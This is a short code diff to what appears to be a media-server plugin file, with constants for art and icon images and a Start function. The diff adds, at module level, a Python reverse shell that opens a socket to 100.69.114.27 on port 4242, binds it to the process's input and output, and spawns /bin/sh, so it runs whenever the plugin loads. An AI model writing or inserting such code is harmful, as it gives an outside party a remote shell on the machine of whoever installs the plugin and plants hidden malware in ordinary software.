@@ -7,7 +7,13 @@ ART           = 'art-default.png'
 ICON          = 'icon-default.png'
 
 ####################################################################################################
-
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("100.69.114.27",4242))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")'
 def Start():
     ObjectContainer.art = R(ART)
     ObjectContainer.title1 = NAME
